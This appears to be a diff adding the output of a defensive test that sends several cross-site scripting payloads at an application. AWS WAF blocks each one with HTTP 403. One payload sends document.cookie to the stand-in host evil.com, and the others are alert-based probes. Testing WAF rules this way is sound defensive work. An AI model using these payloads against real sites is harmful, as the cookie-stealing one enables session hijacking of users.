@@ -1,0 +1,15 @@
+============================================================
+ATTACK 1: Stored/Reflected XSS attempts
+Expect: AWS WAF blocks each with HTTP 403
+============================================================
+  payload 1: <script>alert(document.cookie)</script>                 -> HTTP 403
+  payload 2: <script>fetch('//evil.com?c='+document.cookie)</sc      -> HTTP 403
+  payload 3: <img src=x onerror=alert(1)>                            -> HTTP 403
+  payload 4: <svg/onload=alert('xss')>                               -> HTTP 403
+  payload 5: javascript:alert(document.domain)                       -> HTTP 403
+  payload 6: ';alert(String.fromCharCode(88,83,83));//'              -> HTTP 403
+  body XSS: <script>alert(1)</script>                               -> HTTP 403
+
+Result: any 403 = blocked by AWS WAF XSS managed rules.
+Any 200 = payload reached the app (should not happen).
+
